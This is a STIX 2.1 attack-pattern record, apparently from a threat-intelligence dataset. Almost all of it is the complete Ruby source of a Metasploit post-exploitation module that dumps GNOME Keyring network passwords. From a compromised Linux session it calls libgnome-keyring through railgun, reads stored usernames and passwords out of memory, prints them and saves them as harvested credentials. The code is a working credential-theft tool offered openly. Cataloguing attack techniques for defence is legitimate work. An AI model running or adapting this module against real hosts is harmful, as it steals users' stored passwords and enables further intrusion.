{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--b828d4d2-fa81-41c6-93f3-a92322415039",
    "created": "2024-08-14T16:33:17.300152Z",
    "modified": "2024-08-14T16:33:17.300156Z",
    "name": "Gnome-Keyring Dump",
    "description": " Use libgnome-keyring to extract network passwords for the current user. This module does not require root privileges to run. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/linux/gather/gnome_keyring_dump.rb",
            "external_id": "gnome_keyring_dump.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'bindata'\n\nclass MetasploitModule < Msf::Post\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Gnome-Keyring Dump',\n        'Description' => %q{\n          Use libgnome-keyring to extract network passwords for the current user.\n          This module does not require root privileges to run.\n        },\n        'Author' => 'Spencer McIntyre',\n        'License' => MSF_LICENSE,\n        'Platform' => [ 'linux' ],\n        'SessionTypes' => [ 'meterpreter' ],\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              core_native_arch\n              stdapi_net_resolve_host\n              stdapi_railgun_api\n              stdapi_railgun_memread\n            ]\n          }\n        }\n      )\n    )\n  end\n\n  class GList_x64 < BinData::Record\n    endian :little\n    uint64 :data_ptr\n    uint64 :next_ptr\n    uint64 :prev_ptr\n  end\n\n  class GList_x86 < BinData::Record\n    endian :little\n    uint32 :data_ptr\n    uint32 :next_ptr\n    uint32 :prev_ptr\n  end\n\n  # https://developer.gnome.org/glib/unstable/glib-Doubly-Linked-Lists.html#GList\n  def struct_glist\n    session.native_arch == ARCH_X64 ? GList_x64 : GList_x86\n  end\n\n  class GnomeKeyringNetworkPasswordData_x64 < BinData::Record\n    endian :little\n    uint64 :keyring\n    uint64 :item_id\n    uint64 :protocol\n    uint64 :server\n    uint64 :object\n    uint64 :authtype\n    uint64 :port\n    uint64 :user\n    uint64 :domain\n    uint64 :password\n  end\n\n  class GnomeKeyringNetworkPasswordData_x86 < BinData::Record\n    endian :little\n    uint32 :keyring\n    uint32 :item_id\n    uint32 :protocol\n    uint32 :server\n    uint32 :object\n    uint32 :authtype\n    uint32 :port\n    uint32 :user\n    uint32 :domain\n    uint32 :password\n  end\n\n  # https://developer.gnome.org/gnome-keyring/stable/gnome-keyring-Network-Passwords.html#GnomeKeyringNetworkPasswordData\n  def struct_gnomekeyringnetworkpassworddata\n    session.native_arch == ARCH_X64 ? GnomeKeyringNetworkPasswordData_x64 : GnomeKeyringNetworkPasswordData_x86\n  end\n\n  def init_railgun_defs\n    unless session.railgun.libraries.key?('libgnome_keyring')\n      session.railgun.add_library('libgnome_keyring', 'libgnome-keyring.so.0')\n    end\n    session.railgun.add_function(\n      'libgnome_keyring',\n      'gnome_keyring_is_available',\n      'BOOL',\n      [],\n      nil,\n      'cdecl'\n    )\n    session.railgun.add_function(\n      'libgnome_keyring',\n      'gnome_keyring_find_network_password_sync',\n      'DWORD',\n      [\n        ['PCHAR', 'user', 'in'],\n        ['PCHAR', 'domain', 'in'],\n        ['PCHAR', 'server', 'in'],\n        ['PCHAR', 'object', 'in'],\n        ['PCHAR', 'protocol', 'in'],\n        ['PCHAR', 'authtype', 'in'],\n        ['DWORD', 'port', 'in'],\n        ['PBLOB', 'results', 'out']\n      ],\n      nil,\n      'cdecl'\n    )\n    session.railgun.add_function(\n      'libgnome_keyring',\n      'gnome_keyring_network_password_list_free',\n      'VOID',\n      [['LPVOID', 'list', 'in']],\n      nil,\n      'cdecl'\n    )\n  end\n\n  def get_string(address, chunk_size = 64, max_size = 256)\n    data = ''\n    loop do\n      data << session.railgun.memread(address + data.length, chunk_size)\n      break if data.include?(\"\\x00\") || (data.length >= max_size)\n    end\n\n    if data.include?(\"\\x00\")\n      idx = data.index(\"\\x00\")\n      data = data[0...idx]\n    end\n\n    data[0...max_size]\n  end\n\n  def get_struct(address, record)\n    record = record.new\n    record.read(session.railgun.memread(address, record.num_bytes))\n    Hash[record.field_names.map { |field| [field, record[field]] }]\n  end\n\n  def get_list_entry(address)\n    glist_struct = get_struct(address, struct_glist)\n    glist_struct[:data] = get_struct(glist_struct[:data_ptr], struct_gnomekeyringnetworkpassworddata)\n    glist_struct\n  end\n\n  def report_cred(opts)\n    service_data = {\n      address: opts[:ip],\n      port: opts[:port],\n      service_name: opts[:service_name],\n      protocol: opts[:protocol],\n      workspace_id: myworkspace_id\n    }\n\n    credential_data = {\n      post_reference_name: refname,\n      session_id: session_db_id,\n      origin_type: :session,\n      private_data: opts[:password],\n      private_type: :password,\n      username: opts[:username]\n    }.merge(service_data)\n\n    login_data = {\n      core: create_credential(credential_data),\n      status: Metasploit::Model::Login::Status::UNTRIED\n    }.merge(service_data)\n\n    create_credential_login(login_data)\n  end\n\n  def resolve_host(name)\n    address = @hostname_cache[name]\n    return address unless address.nil?\n\n    vprint_status(\"Resolving hostname: #{name}\")\n    begin\n      address = session.net.resolve.resolve_host(name)[:ip]\n    rescue Rex::Post::Meterpreter::RequestError\n    end\n    @hostname_cache[name] = address\n  end\n\n  def resolve_port(service)\n    port = {\n      'ftp' => 21,\n      'http' => 80,\n      'https' => 443,\n      'sftp' => 22,\n      'ssh' => 22,\n      'smb' => 445\n    }[service]\n    port.nil? ? 0 : port\n  end\n\n  def run\n    init_railgun_defs\n    @hostname_cache = {}\n    libgnome_keyring = session.railgun.libgnome_keyring\n\n    unless libgnome_keyring.gnome_keyring_is_available['return']\n      fail_with(Failure::NoTarget, 'libgnome-keyring is unavailable')\n    end\n\n    result = libgnome_keyring.gnome_keyring_find_network_password_sync(\n      nil,  # user\n      nil,  # domain\n      nil,  # server\n      nil,  # object\n      nil,  # protocol\n      nil,  # authtype\n      0,    # port\n      session.native_arch == ARCH_X64 ? 8 : 4\n    )\n\n    list_anchor = result['results'].unpack(session.native_arch == ARCH_X64 ? 'Q' : 'L')[0]\n    fail_with(Failure::NoTarget, 'Did not receive a list of passwords') if list_anchor == 0\n\n    entry = { next_ptr: list_anchor }\n    loop do\n      entry = get_list_entry(entry[:next_ptr])\n      pw_data = entry[:data]\n      # resolve necessary string fields to non-empty strings or nil\n      %i[server user domain password protocol].each do |field|\n        value = pw_data[field]\n        pw_data[field] = nil\n        next if value == 0\n\n        value = get_string(value)\n        next if value.empty?\n\n        pw_data[field] = value\n      end\n\n      # skip the entry if we don't at least have a username and password\n      next if pw_data[:user].nil? || pw_data[:password].nil?\n\n      printable = ''\n      printable << \"#{pw_data[:protocol]}://\" unless pw_data[:protocol].nil?\n      printable << \"#{pw_data[:domain]}\\\\\" unless pw_data[:domain].nil?\n      printable << \"#{pw_data[:user]}:#{pw_data[:password]}\"\n      unless pw_data[:server].nil?\n        printable << \"@#{pw_data[:server]}\"\n        printable << \":#{pw_data[:port]}\"\n      end\n      print_good(printable)\n\n      pw_data[:port] = resolve_port(pw_data[:protocol]) if (pw_data[:port] == 0) && !pw_data[:protocol].nil?\n      next if pw_data[:port] == 0  # can't report without a valid port\n\n      ip_address = resolve_host(pw_data[:server])\n      next if ip_address.nil?      # can't report without an ip address\n\n      report_cred(\n        ip: ip_address,\n        port: pw_data[:port],\n        protocol: 'tcp',\n        service_name: pw_data[:protocol],\n        username: pw_data[:user],\n        password: pw_data[:password]\n      )\n      break unless (entry[:next_ptr] != list_anchor) && (entry[:next_ptr] != 0)\n    end\n\n    libgnome_keyring.gnome_keyring_network_password_list_free(list_anchor)\n  end\nend\n",
    "x_mitre_platforms": [
        "[ 'linux' ]"
    ]
}